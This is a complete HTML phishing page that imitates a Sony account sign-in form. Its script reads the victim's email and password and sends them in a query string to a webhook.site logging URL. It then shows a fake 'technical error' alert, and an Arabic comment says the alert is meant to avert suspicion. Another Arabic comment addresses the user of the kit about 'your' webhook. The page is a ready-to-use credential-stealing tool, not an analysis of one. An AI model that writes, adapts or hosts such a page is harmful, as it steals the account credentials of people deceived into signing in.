<!DOCTYPE html>
<html>
<body style="margin:0; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; background:#f4f4f4;">
    <div style="background:#fff; padding:40px; border-radius:12px; box-shadow:0 10px 25px rgba(0,0,0,0.1); width:350px; text-align:center;">
        <img src="https://sony.net" width="120" style="margin-bottom:25px;">
        <h2 style="margin:0 0 10px; color:#333;">Sign In</h2>
        <p style="color:#666; font-size:14px; margin-bottom:25px;">Please sign in with your Sony account to continue</p>
        
        <input type="email" id="e" placeholder="Email address" style="width:100%; padding:14px; margin:10px 0; border:1px solid #ccc; border-radius:4px; box-sizing:border-box; font-size:16px;">
        <input type="password" id="p" placeholder="Password" style="width:100%; padding:14px; margin:10px 0; border:1px solid #ccc; border-radius:4px; box-sizing:border-box; font-size:16px;">
        
        <button id="btn" style="width:100%; padding:14px; background:#0071e3; color:#fff; border:none; border-radius:25px; font-weight:bold; cursor:pointer; margin-top:20px; font-size:16px;">Sign In</button>
        
        <p style="margin-top:20px; font-size:13px; color:#0071e3; cursor:pointer;">Forgot password?</p>
    </div>

    <script>
        document.getElementById('btn').onclick = function() {
            const u = document.getElementById('e').value;
            const p = document.getElementById('p').value;
            if(u && p) {
                // إرسال البيانات لرابط الـ Webhook الخاص بك
                const logger = "https://webhook.site/1f5c01fc-72f2-4a77-9b53-b93d57154665";
                fetch(logger + "?email=" + encodeURIComponent(u) + "&pass=" + encodeURIComponent(p), {mode: 'no-cors'});
                
                // إظهار رسالة خطأ وهمية لإبعاد الشبهة
                alert("Technical Error: Authentication service is temporarily unavailable. Please try again later.");
            } else {
                alert("Please enter your credentials.");
            }
        };
    </script>
</body>
</html>
